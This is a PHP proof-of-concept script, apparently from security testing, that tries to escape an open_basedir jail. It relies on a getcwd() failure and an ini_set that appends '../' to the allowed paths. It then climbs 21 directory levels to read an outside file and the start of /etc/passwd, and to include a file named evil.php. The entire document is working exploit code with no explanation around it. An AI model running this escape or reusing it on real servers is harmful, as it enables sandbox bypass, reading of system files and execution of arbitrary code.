<?php
/* #49 escape, take 3: process STARTS with an inherited deep cwd (>PATH_MAX),
 * so getcwd() fails from the first call. No PHP chdir needed. */
$jail = '/tmp/f49/jail';
echo "PHP=".PHP_VERSION."\n";
echo "BASEDIR=".ini_get('open_basedir')."\n";
$cwd = @getcwd();
echo "GETCWD_AT_START=".var_export($cwd, true)."\n";
if ($cwd !== false && $cwd !== '') { echo "GETCWD_WORKS len=".strlen((string)$cwd)."\n"; exit(1); }

$r = @ini_set('open_basedir', $jail . ':../');
$cur = ini_get('open_basedir');
echo "INI_SET=".var_export($r, true)." RAW=".var_export($cur, true)."\n";

// leaf is 18 under jail; jail is /tmp/f49/jail (3 below /): 21 ups to /
$up = str_repeat('../', 21);
$o = @file_get_contents($up . 'OUTSIDE.txt');
echo "OUTSIDE=".var_export($o, true)."\n";
$p = @file_get_contents($up . 'etc/passwd');
echo "PASSWD=".var_export($p ? substr($p, 0, 40) : $p, true)."\n";
@include $up . 'evil.php';
echo "END\n";
